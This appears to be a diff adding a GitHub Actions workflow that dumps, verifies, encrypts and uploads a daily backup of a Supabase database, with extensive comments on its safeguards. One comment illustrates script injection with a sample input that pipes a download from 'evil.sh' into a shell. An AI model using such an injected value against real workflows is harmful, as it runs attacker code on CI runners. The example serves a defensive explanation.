@@ -1,0 +1,487 @@
+# ─────────────────────────────────────────────────────────────────────────────
+# Scheduled pg_dump of the live Supabase database.
+#
+# WHY: Supabase's free tier takes no automatic backups and has no PITR. On
+# 23 Sep 2026 a reproduction harness nulled two columns on all 15 live
+# UserAchievement rows and the newest dump on disk was five days old, so the
+# values were gone for good. Backups on this project were ad-hoc -- somebody
+# had to remember. This is the thing that remembers.
+#
+# RESTORE INSTRUCTIONS: .github/workflows/RESTORE.md. Read it BEFORE you need
+# it. A backup nobody has rehearsed is a hope, not a backup.
+#
+# ── THE DUMP IS ENCRYPTED, AND THAT IS NOT OPTIONAL ──────────────────────────
+#
+# katzennjammer/baylo-api is a PUBLIC repository, and workflow artifacts on a
+# public repository can be downloaded by anyone who can read the repo -- which
+# is everybody. A plain dump of `public` would publish, in one zip:
+#
+#     User                  32 rows   real emails, bcrypt hashes, dateOfBirth
+#     IdVerification         7 rows   government-ID records: idNumberHash,
+#                                     claimKey, and imagePublicId/imageUrl --
+#                                     and a Cloudinary secure_url is a
+#                                     PERMANENT credential, so a stale row can
+#                                     still resolve to the ID photo
+#     Item                  60 rows   pickupAddress / pickupLat / pickupLng --
+#                                     home addresses
+#     Message              164 rows   private conversations
+#
+# The three token tables (RefreshToken, PasswordResetToken,
+# EmailVerificationToken) are excluded from the dump entirely -- see the Dump
+# step. Everything above is still in there, so:
+#
+# So the dump is symmetrically encrypted with AES256 before it is ever handed
+# to actions/upload-artifact, and the job asserts the plaintext is gone first.
+# Making the repo private would reduce the audience but not to zero -- forks,
+# leaked PATs and anyone with read access still reach artifacts -- and a
+# production dump carrying government-ID references should be encrypted at
+# rest regardless of who owns the bucket. Do not "simplify" this step away.
+#
+# ── TWO SECRETS ARE REQUIRED ─────────────────────────────────────────────────
+#
+#   SUPABASE_DB_URL     libpq connection URI. NOT the app's DATABASE_URL if
+#                       that one carries Prisma-only query parameters --
+#                       libpq rejects `?schema=`, `?pgbouncer=true` and
+#                       `?connection_limit=` outright. Format and gotchas are
+#                       in RESTORE.md; port MUST be 5432 (session mode).
+#   BACKUP_PASSPHRASE   Long random string. LOSE THIS AND EVERY DUMP IS
+#                       LANDFILL. Store it somewhere that is not this repo and
+#                       not this database.
+#
+# ── THINGS THAT WILL BITE ────────────────────────────────────────────────────
+#
+# * pg_dump refuses to dump a server NEWER than itself. Supabase is on
+#   PostgreSQL 17.6; ubuntu-latest ships client 16. Hence the PGDG repo and
+#   the hard version assert below. When Supabase bumps to 18, this job fails
+#   loudly and you change PG_MAJOR -- which is the correct outcome.
+# * GitHub disables scheduled workflows in repos with no activity for 60 days,
+#   silently. A backup that stopped two months ago looks exactly like one that
+#   ran this morning until you go and look. Check the Actions tab occasionally.
+# * Scheduled runs are queued, not guaranteed on time; the top of the hour is
+#   the most congested slot, so this runs at :17.
+# ─────────────────────────────────────────────────────────────────────────────
+
+name: Database backup
+
+on:
+  schedule:
+    # 18:17 UTC = 02:17 Asia/Manila, daily.
+    - cron: "17 18 * * *"
+    # Twice daily: uncomment for a 12-hour worst-case loss window instead of 24.
+    # - cron: "17 6 * * *"
+  workflow_dispatch:
+    inputs:
+      reason:
+        description: "Why you are running this by hand (shows in the summary)"
+        required: false
+        default: "manual verification run"
+
+# contents: read  -- the job never writes to the repo.
+# issues:   write -- so a failure can open an issue instead of dying quietly
+#                    in a tab nobody has open.
+permissions:
+  contents: read
+  issues: write
+
+concurrency:
+  group: db-backup
+  cancel-in-progress: false
+
+env:
+  PG_MAJOR: "17"
+  # 14 daily dumps. The dump is ~150 KB encrypted, so storage is not the
+  # constraint and never will be -- see RESTORE.md, "Why 14".
+  RETENTION_DAYS: "14"
+
+jobs:
+  dump:
+    name: pg_dump → verify → encrypt → artifact
+    runs-on: ubuntu-latest
+    timeout-minutes: 15
+
+    steps:
+      # ── 1 ── Fail before doing any work if the secrets are not set. An
+      # unset secret expands to an empty string, and `pg_dump ""` produces a
+      # confusing error about a socket in /var/run rather than "you forgot the
+      # secret". Say the true thing.
+      - name: Check required secrets
+        env:
+          DB_URL: ${{ secrets.SUPABASE_DB_URL }}
+          PASSPHRASE: ${{ secrets.BACKUP_PASSPHRASE }}
+        run: |
+          set -euo pipefail
+          missing=0
+          if [ -z "${DB_URL}" ]; then
+            echo "::error title=Missing secret::SUPABASE_DB_URL is not set. Settings → Secrets and variables → Actions."
+            missing=1
+          fi
+          if [ -z "${PASSPHRASE}" ]; then
+            echo "::error title=Missing secret::BACKUP_PASSPHRASE is not set. Settings → Secrets and variables → Actions."
+            missing=1
+          fi
+          if [ "${#PASSPHRASE}" -lt 16 ] && [ -n "${PASSPHRASE}" ]; then
+            echo "::error title=Weak passphrase::BACKUP_PASSPHRASE is under 16 characters. Use something long and random."
+            missing=1
+          fi
+          [ "${missing}" -eq 0 ] || exit 1
+          echo "Both secrets present."
+
+      # ── 2 ── pg_dump must be at least as new as the server. ubuntu-latest
+      # ships 16; Supabase runs 17.6. Without this the job fails with
+      # "server version: 17.6; pg_dump version: 16.x -- aborting", which is
+      # the single most common way one of these workflows never works.
+      - name: Install PostgreSQL ${{ env.PG_MAJOR }} client
+        run: |
+          set -euo pipefail
+          sudo install -d /usr/share/postgresql-common/pgdg
+          sudo curl -fsSL -o /usr/share/postgresql-common/pgdg/apt.postgresql.org.asc \
+            https://www.postgresql.org/media/keys/ACCC4CF8.asc
+          echo "deb [signed-by=/usr/share/postgresql-common/pgdg/apt.postgresql.org.asc] \
+          https://apt.postgresql.org/pub/repos/apt $(lsb_release -cs)-pgdg main" \
+            | sudo tee /etc/apt/sources.list.d/pgdg.list > /dev/null
+          sudo apt-get update -qq
+          sudo apt-get install -y -qq "postgresql-client-${PG_MAJOR}"
+
+          actual="$(pg_dump --version | awk '{print $3}' | cut -d. -f1)"
+          echo "pg_dump: $(pg_dump --version)"
+          if [ "${actual}" != "${PG_MAJOR}" ]; then
+            echo "::error title=Wrong pg_dump::Expected major ${PG_MAJOR}, got ${actual}. A client older than the server cannot dump it."
+            exit 1
+          fi
+
+      # ── 3 ── The dump itself.
+      #
+      # --schema=public        Everything the application owns. Supabase's own
+      #                        schemas (auth, storage, realtime, vault, graphql,
+      #                        extensions) belong to the platform, the `postgres`
+      #                        role cannot dump them completely, and restoring
+      #                        them over a fresh project would fight its
+      #                        migrations. This app uses NextAuth with its own
+      #                        User table in public; auth.* is not used.
+      # --no-owner
+      # --no-privileges        The restore target will not have Supabase's roles.
+      #                        Without these, every statement fails on a role
+      #                        that does not exist.
+      #
+      # Two formats, because they fail differently and both are ~free:
+      #   .dump  custom format. pg_restore can pull ONE table out of it, which
+      #          is exactly what the September incident needed -- 15 rows in
+      #          one table, everything else healthy. Restoring the whole
+      #          database to fix one table is how a small incident becomes a
+      #          big one.
+      #   .sql   plain text. Greppable, diffable, and restorable by any psql
+      #          on earth with no version-matched pg_restore. It is the copy
+      #          that still works when something about the other one is wrong.
+      - name: Dump
+        env:
+          PGSSLMODE: require
+          PGCONNECT_TIMEOUT: "30"
+          # Quoted and never echoed. GitHub masks secrets in logs, but the
+          # reliable way not to leak one is not to print it.
+          SUPABASE_DB_URL: ${{ secrets.SUPABASE_DB_URL }}
+        run: |
+          set -euo pipefail
+          mkdir -p out
+          stamp="$(date -u +%Y%m%d-%H%M%S)"
+          echo "STAMP=${stamp}" >> "$GITHUB_ENV"
+
+          # ── EXCLUDED: ephemeral auth material ─────────────────────────────
+          #
+          # Session and one-shot tokens. Leaving the ROWS out shrinks what a
+          # leaked passphrase would be worth, and costs nothing a restore
+          # actually wants: coming back from a backup SHOULD log everyone out
+          # and void pending resets rather than resurrect week-old sessions.
+          #
+          # --exclude-table-data, NOT --exclude-table. The latter drops the
+          # table DEFINITION as well, which would make the plain .sql restore
+          # into a fresh project produce a database missing three tables that
+          # Prisma expects -- the app would fail on first login rather than at
+          # restore time, which is the worst place to discover it. This keeps
+          # the CREATE TABLE and omits only the rows, so a restored database
+          # has the full schema with three empty tables.
+          #
+          # THE QUOTING IS NOT OPTIONAL. The pattern follows psql's rules, so
+          # an unquoted RefreshToken is folded to `refreshtoken`, matches
+          # nothing, and the rows are silently INCLUDED -- the exact opposite
+          # of what this list is for, with no error and no warning. The
+          # embedded double quotes preserve the case, and the verify step
+          # asserts each one is genuinely absent, because a silent no-op here
+          # is the kind of failure that surfaces in someone else's breach
+          # report.
+          excluded=(RefreshToken PasswordResetToken EmailVerificationToken)
+          echo "EXCLUDED_COUNT=${#excluded[@]}" >> "$GITHUB_ENV"
+          echo "EXCLUDED_NAMES=${excluded[*]}" >> "$GITHUB_ENV"
+
+          common=(--schema=public --no-owner --no-privileges --verbose)
+          for t in "${excluded[@]}"; do
+            common+=(--exclude-table-data="public.\"${t}\"")
+          done
+          echo "excluding row data: ${excluded[*]}"
+
+          echo "── custom format ──"
+          pg_dump "${SUPABASE_DB_URL}" "${common[@]}" \
+            --format=custom --file="out/baylo-${stamp}.dump"
+
+          echo "── plain SQL ──"
+          pg_dump "${SUPABASE_DB_URL}" "${common[@]}" \
+            --format=plain --file="out/baylo-${stamp}.sql"
+
+      # ── 4 ── Verification. This is the step that makes the backup real.
+      #
+      # pg_dump exiting 0 is necessary and not sufficient: a dump can succeed
+      # and still be useless (connected to the wrong database, dumped an empty
+      # schema, got truncated on upload). Each check below has a failure it is
+      # actually there to catch, and each one FAILS THE JOB rather than
+      # printing a warning nobody reads.
+      - name: Verify the dump
+        env:
+          PGSSLMODE: require
+          PGCONNECT_TIMEOUT: "30"
+          SUPABASE_DB_URL: ${{ secrets.SUPABASE_DB_URL }}
+        run: |
+          set -euo pipefail
+          dump="out/baylo-${STAMP}.dump"
+          sql="out/baylo-${STAMP}.sql"
+
+          # (a) Non-empty, and over a floor. 100 KB is the floor
+          # scripts/backup-baylo-pg.ps1 already uses for this database. A dump
+          # that suddenly halves is the shape of a partial failure.
+          for f in "${dump}" "${sql}"; do
+            [ -s "${f}" ] || { echo "::error title=Empty dump::${f} is empty"; exit 1; }
+          done
+          sql_bytes="$(stat -c%s "${sql}")"
+          dump_bytes="$(stat -c%s "${dump}")"
+          echo "plain SQL : ${sql_bytes} bytes"
+          echo "custom    : ${dump_bytes} bytes"
+          if [ "${sql_bytes}" -lt 102400 ]; then
+            echo "::error title=Dump too small::plain SQL is ${sql_bytes} bytes, floor is 102400. Wrong database, or a partial dump."
+            exit 1
+          fi
+
+          # (b) pg_dump writes this as its last line. If the file was
+          # truncated -- disk, network, a killed process -- the trailer is the
+          # first thing to go, and the file still LOOKS like a dump.
+          if ! tail -5 "${sql}" | grep -q "PostgreSQL database dump complete"; then
+            echo "::error title=Truncated dump::the plain dump has no completion trailer"
+            exit 1
+          fi
+
+          # (c) The custom dump must be readable by pg_restore. This catches
+          # corruption that a byte count cannot.
+          pg_restore --list "${dump}" > out/toc.txt
+
+          # (d) Table count in the dump == table count live. This is the check
+          # that catches the worst silent failure: connecting successfully to
+          # the WRONG database and faithfully dumping its 0 tables.
+          #
+          # `|| true` and not `|| echo 0`: grep -c ALREADY prints 0 when it
+          # matches nothing, and exits 1. `|| echo 0` would append a second
+          # line and the comparison below would die on "0\n0" instead of
+          # reporting a mismatch.
+          # Ask live for its table NAMES and check each one individually,
+          # rather than comparing two counts. Counting would make this check
+          # depend on how pg_dump chooses to represent a data-excluded table in
+          # its TOC -- a detail that could change between majors and would fail
+          # the backup over an off-by-three in my model of pg_dump. Names are
+          # exact, and when something IS missing this says which table instead
+          # of "expected 30, got 29".
+          psql "${SUPABASE_DB_URL}" -tAc \
+            "SELECT table_name FROM information_schema.tables
+              WHERE table_schema='public' AND table_type='BASE TABLE'
+              ORDER BY table_name" > out/live-tables.txt
+          live_tables="$(grep -c . out/live-tables.txt)"
+          echo "live tables: ${live_tables}"
+
+          missing=""
+          leaked=""
+          while read -r t; do
+            [ -n "${t}" ] || continue
+            present=0
+            grep -qE "TABLE DATA public ${t}( |$)" out/toc.txt && present=1
+
+            if printf '%s\n' ${EXCLUDED_NAMES} | grep -qx "${t}"; then
+              # Must NOT be there. pg_dump does not warn when the pattern
+              # matches nothing, so a case-folding slip would quietly ship
+              # 240 rows of session tokens in a backup whose whole point was
+              # not to carry them.
+              [ "${present}" -eq 1 ] && leaked="${leaked} ${t}"
+            else
+              [ "${present}" -eq 0 ] && missing="${missing} ${t}"
+            fi
+          done < out/live-tables.txt
+
+          if [ -n "${leaked}" ]; then
+            echo "::error title=Excluded data present::${leaked} should have been excluded but carries row data -- check the --exclude-table-data quoting"
+            exit 1
+          fi
+          if [ -n "${missing}" ]; then
+            echo "::error title=Tables missing from dump::${missing}"
+            exit 1
+          fi
+          echo "every live table accounted for; row data withheld for: ${EXCLUDED_NAMES}"
+
+          # (e) Tables this application cannot function without. A dump that
+          # somehow has the right count but not these is not a Baylo backup.
+          # `( |$)` because --no-owner can leave the TOC line ending at the
+          # table name, with no owner column after it to anchor a space on.
+          for t in User Item LeafTransaction UserAchievement TradeRequest; do
+            grep -qE "TABLE DATA public ${t}( |$)" out/toc.txt \
+              || { echo "::error title=Missing table::${t} is not in the dump"; exit 1; }
+          done
+
+          # (f) A manifest, left in PLAINTEXT on purpose: it lets you pick the
+          # right artifact to download without decrypting three of them first.
+          # Counts and a checksum only -- no row data.
+          {
+            echo "baylo backup ${STAMP}"
+            echo "run          : ${GITHUB_RUN_ID} (${GITHUB_RUN_NUMBER})"
+            echo "commit       : ${GITHUB_SHA}"
+            echo "server       : $(psql "${SUPABASE_DB_URL}" -tAc 'SELECT version()')"
+            echo "pg_dump      : $(pg_dump --version)"
+            echo "tables       : ${live_tables} (row data withheld: ${EXCLUDED_NAMES})"
+            echo "plain bytes  : ${sql_bytes}"
+            echo "custom bytes : ${dump_bytes}"
+            echo "sha256 custom: $(sha256sum "${dump}" | awk '{print $1}')"
+            echo "sha256 plain : $(sha256sum "${sql}" | awk '{print $1}')"
+            echo ""
+            echo "row counts at dump time:"
+            psql "${SUPABASE_DB_URL}" -tAF$'\t' -c "
+              SELECT relname, n_live_tup
+              FROM pg_stat_user_tables
+              WHERE schemaname='public'
+              ORDER BY relname"
+            echo ""
+            # The ledger invariant this project checks on every backup. RECORDED,
+            # NOT GATED: if the ledger is broken you want the backup MORE, not
+            # less, so this must never be the reason a dump is thrown away.
+            echo "ledger invariant at dump time (recorded, not enforced):"
+            psql "${SUPABASE_DB_URL}" -tAc "
+              SELECT 'SUM(User.leaves)=' || (SELECT COALESCE(SUM(leaves),0) FROM \"public\".\"User\")
+                  || '  SUM(LeafTransaction.amount)=' || (SELECT COALESCE(SUM(amount),0) FROM \"public\".\"LeafTransaction\")"
+          } > out/MANIFEST.txt
+
+          echo "── manifest ──"
+          cat out/MANIFEST.txt
+
+      # ── 5 ── Encrypt, then prove the plaintext is gone.
+      #
+      # gpg is preinstalled on ubuntu-latest. Symmetric AES256 with a
+      # passphrase: no keyring to manage, no key to rotate, and `gpg -d` on any
+      # machine gets the file back. The passphrase goes in on a file descriptor
+      # rather than the command line -- argv is world-readable on Linux.
+      - name: Encrypt
+        env:
+          BACKUP_PASSPHRASE: ${{ secrets.BACKUP_PASSPHRASE }}
+        run: |
+          set -euo pipefail
+          for f in "out/baylo-${STAMP}.dump" "out/baylo-${STAMP}.sql"; do
+            printf '%s' "${BACKUP_PASSPHRASE}" | gpg --batch --yes --quiet \
+              --passphrase-fd 0 --pinentry-mode loopback \
+              --symmetric --cipher-algo AES256 --compress-algo zlib \
+              --output "${f}.gpg" "${f}"
+            [ -s "${f}.gpg" ] || { echo "::error title=Encryption produced nothing::${f}.gpg"; exit 1; }
+            rm -f "${f}"
+          done
+
+          # Round-trip one of them. An encrypted file that cannot be decrypted
+          # is indistinguishable from a good one until the day you need it, and
+          # that day is the worst possible time to find out.
+          printf '%s' "${BACKUP_PASSPHRASE}" | gpg --batch --quiet \
+            --passphrase-fd 0 --pinentry-mode loopback \
+            --decrypt "out/baylo-${STAMP}.dump.gpg" > /tmp/roundtrip.dump
+          pg_restore --list /tmp/roundtrip.dump > /dev/null
+          rm -f /tmp/roundtrip.dump
+          echo "decrypt round-trip OK"
+
+          # THE UPLOAD GUARD. Everything above is worthless if a plaintext dump
+          # reaches a public artifact, so this asserts it rather than assuming
+          # the `rm` worked.
+          if ls out/*.sql out/*.dump 2>/dev/null | grep -q .; then
+            echo "::error title=Plaintext present::refusing to upload -- unencrypted dump still in out/"
+            ls -la out
+            exit 1
+          fi
+          rm -f out/toc.txt
+          ls -la out
+
+      - name: Upload artifact
+        uses: actions/upload-artifact@v4
+        with:
+          name: baylo-db-backup-${{ env.STAMP }}
+          path: out/
+          retention-days: ${{ env.RETENTION_DAYS }}
+          if-no-files-found: error
+          compression-level: 0 # already compressed by gpg; recompressing wastes time
+
+      # RUN_REASON goes in as an ENV VAR, not `${{ inputs.reason }}` spliced
+      # into the script. A workflow_dispatch input is attacker-controlled text
+      # as far as the shell is concerned, and interpolating one directly into a
+      # `run:` block is the standard GitHub Actions script-injection hole: a
+      # reason of `"; curl evil.sh | sh; #` would execute. Same division as
+      # everywhere else in this repo -- values are values, never syntax.
+      - name: Summary
+        if: always()
+        env:
+          RUN_REASON: ${{ github.event.inputs.reason || 'scheduled' }}
+        run: |
+          {
+            echo "## Baylo database backup"
+            echo ""
+            echo "| | |"
+            echo "|---|---|"
+            echo "| Artifact | \`baylo-db-backup-${STAMP:-unknown}\` |"
+            echo "| Retention | ${RETENTION_DAYS} days |"
+            echo "| Trigger | ${GITHUB_EVENT_NAME} |"
+            echo "| Reason | ${RUN_REASON} |"
+            echo ""
+            echo "Encrypted with AES256. Restore: \`.github/workflows/RESTORE.md\`."
+          } >> "$GITHUB_STEP_SUMMARY"
+
+      # ── 6 ── Fail LOUDLY.
+      #
+      # GitHub emails the repo owner when a SCHEDULED run fails, and that is the
+      # whole of the default notification -- one email, to one person, easily
+      # filtered. A backup that has been failing for a fortnight while the
+      # Actions tab shows a red cross nobody opened is the false confidence this
+      # workflow exists to prevent. So a failure files an issue: it is visible,
+      # it is assignable, and it does not go away when you close the tab.
+      #
+      # One issue per outage, not one per run -- it reuses an open issue with
+      # the same label and comments on it instead.
+      - name: Open an issue on failure
+        if: failure()
+        uses: actions/github-script@v7
+        with:
+          script: |
+            const label = 'backup-failure';
+            const title = 'Database backup is failing';
+            const url = `${context.serverUrl}/${context.repo.owner}/${context.repo.repo}/actions/runs/${context.runId}`;
+            const body = [
+              `The scheduled database backup failed.`,
+              ``,
+              `* Run: ${url}`,
+              `* Commit: ${context.sha}`,
+              `* Triggered by: ${context.eventName}`,
+              ``,
+              `**There is no backup from this run.** Supabase free tier has no`,
+              `automatic backups, so until this is fixed the database is`,
+              `unprotected. Check the failing step first -- the usual causes are`,
+              `a rotated SUPABASE_DB_URL, Supabase upgrading past the pinned`,
+              `pg_dump major, or the project being paused for inactivity.`,
+            ].join('\n');
+
+            const existing = await github.rest.issues.listForRepo({
+              ...context.repo, state: 'open', labels: label,
+            });
+
+            if (existing.data.length > 0) {
+              await github.rest.issues.createComment({
+                ...context.repo, issue_number: existing.data[0].number, body,
+              });
+              core.notice(`Commented on existing issue #${existing.data[0].number}`);
+            } else {
+              await github.rest.issues.create({
+                ...context.repo, title, body, labels: [label],
+              });
+              core.notice('Opened a new backup-failure issue');
+            }
